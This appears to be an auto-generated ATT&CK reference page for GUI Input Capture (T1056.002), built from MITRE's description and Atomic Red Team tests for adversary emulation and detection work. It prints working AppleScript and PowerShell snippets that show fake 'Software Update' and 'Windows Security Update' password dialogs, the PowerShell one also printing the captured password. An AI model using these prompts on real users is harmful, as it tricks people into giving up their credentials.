
# GUI Input Capture

## Description

### MITRE Description

> Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015). 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1056/002

## Potential Commands

```
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```

## Commands Dataset

```
[{'command': 'osascript -e \'tell app "System Preferences" to activate\' -e '
             '\'tell app "System Preferences" to activate\' -e \'tell app '
             '"System Preferences" to display dialog "Software Update requires '
             'that you type your password to apply changes." & return & '
             'return  default answer "" with icon 1 with hidden answer with '
             'title "Software Update"\'\n',
  'name': None,
  'source': 'atomics/T1056.002/T1056.002.yaml'},
 {'command': '# Creates GUI to prompt for password. Expect long pause before '
             'prompt is available.    \n'
             "$cred = $host.UI.PromptForCredential('Windows Security Update', "
             "'',[Environment]::UserName, [Environment]::UserDomainName)\n"
             '# Using write-warning to allow message to show on console as '
             'echo and other similar commands are not visable from the '
             'Invoke-AtomicTest framework.\n'
             'write-warning $cred.GetNetworkCredential().Password\n',
  'name': None,
  'source': 'atomics/T1056.002/T1056.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Input Capture: GUI Input Capture': {'atomic_tests': [{'auto_generated_guid': '76628574-0bc1-4646-8fe2-8f4427b47d15',
                                                                                'description': 'Prompt '
                                                                                               'User '
                                                                                               'for '
                                                                                               'Password '
                                                                                               '(Local '
                                                                                               'Phishing)\n'
                                                                                               'Reference: '
                                                                                               'http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n',
                                                                                'executor': {'command': 'osascript '
                                                                                                        '-e '
                                                                                                        "'tell "
                                                                                                        'app '
                                                                                                        '"System '
                                                                                                        'Preferences" '
                                                                                                        'to '
                                                                                                        "activate' "
                                                                                                        '-e '
                                                                                                        "'tell "
                                                                                                        'app '
                                                                                                        '"System '
                                                                                                        'Preferences" '
                                                                                                        'to '
                                                                                                        "activate' "
                                                                                                        '-e '
                                                                                                        "'tell "
                                                                                                        'app '
                                                                                                        '"System '
                                                                                                        'Preferences" '
                                                                                                        'to '
                                                                                                        'display '
                                                                                                        'dialog '
                                                                                                        '"Software '
                                                                                                        'Update '
                                                                                                        'requires '
                                                                                                        'that '
                                                                                                        'you '
                                                                                                        'type '
                                                                                                        'your '
                                                                                                        'password '
                                                                                                        'to '
                                                                                                        'apply '
                                                                                                        'changes." '
                                                                                                        '& '
                                                                                                        'return '
                                                                                                        '& '
                                                                                                        'return  '
                                                                                                        'default '
                                                                                                        'answer '
                                                                                                        '"" '
                                                                                                        'with '
                                                                                                        'icon '
                                                                                                        '1 '
                                                                                                        'with '
                                                                                                        'hidden '
                                                                                                        'answer '
                                                                                                        'with '
                                                                                                        'title '
                                                                                                        '"Software '
                                                                                                        'Update"\'\n',
                                                                                             'name': 'bash'},
                                                                                'name': 'AppleScript '
                                                                                        '- '
                                                                                        'Prompt '
                                                                                        'User '
                                                                                        'for '
                                                                                        'Password',
                                                                                'supported_platforms': ['macos']},
                                                                               {'auto_generated_guid': '2b162bfd-0928-4d4c-9ec3-4d9f88374b52',
                                                                                'description': 'Prompt '
                                                                                               'User '
                                                                                               'for '
                                                                                               'Password '
                                                                                               '(Local '
                                                                                               'Phishing) '
                                                                                               'as '
                                                                                               'seen '
                                                                                               'in '
                                                                                               'Stitch '
                                                                                               'RAT. '
                                                                                               'Upon '
                                                                                               'execution, '
                                                                                               'a '
                                                                                               'window '
                                                                                               'will '
                                                                                               'appear '
                                                                                               'for '
                                                                                               'the '
                                                                                               'user '
                                                                                               'to '
                                                                                               'enter '
                                                                                               'their '
                                                                                               'credentials.\n'
                                                                                               '\n'
                                                                                               'Reference: '
                                                                                               'https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n',
                                                                                'executor': {'command': '# '
                                                                                                        'Creates '
                                                                                                        'GUI '
                                                                                                        'to '
                                                                                                        'prompt '
                                                                                                        'for '
                                                                                                        'password. '
                                                                                                        'Expect '
                                                                                                        'long '
                                                                                                        'pause '
                                                                                                        'before '
                                                                                                        'prompt '
                                                                                                        'is '
                                                                                                        'available.    \n'
                                                                                                        '$cred '
                                                                                                        '= '
                                                                                                        "$host.UI.PromptForCredential('Windows "
                                                                                                        'Security '
                                                                                                        "Update', "
                                                                                                        "'',[Environment]::UserName, "
                                                                                                        '[Environment]::UserDomainName)\n'
                                                                                                        '# '
                                                                                                        'Using '
                                                                                                        'write-warning '
                                                                                                        'to '
                                                                                                        'allow '
                                                                                                        'message '
                                                                                                        'to '
                                                                                                        'show '
                                                                                                        'on '
                                                                                                        'console '
                                                                                                        'as '
                                                                                                        'echo '
                                                                                                        'and '
                                                                                                        'other '
                                                                                                        'similar '
                                                                                                        'commands '
                                                                                                        'are '
                                                                                                        'not '
                                                                                                        'visable '
                                                                                                        'from '
                                                                                                        'the '
                                                                                                        'Invoke-AtomicTest '
                                                                                                        'framework.\n'
                                                                                                        'write-warning '
                                                                                                        '$cred.GetNetworkCredential().Password\n',
                                                                                             'name': 'powershell'},
                                                                                'name': 'PowerShell '
                                                                                        '- '
                                                                                        'Prompt '
                                                                                        'User '
                                                                                        'for '
                                                                                        'Password',
                                                                                'supported_platforms': ['windows']}],
                                                              'attack_technique': 'T1056.002',
                                                              'display_name': 'Input '
                                                                              'Capture: '
                                                                              'GUI '
                                                                              'Input '
                                                                              'Capture'}}]
```

# Tactics


* [Collection](../tactics/Collection.md)

* [Credential Access](../tactics/Credential-Access.md)
    

# Mitigations


* [User Training](../mitigations/User-Training.md)


# Actors


* [FIN4](../actors/FIN4.md)

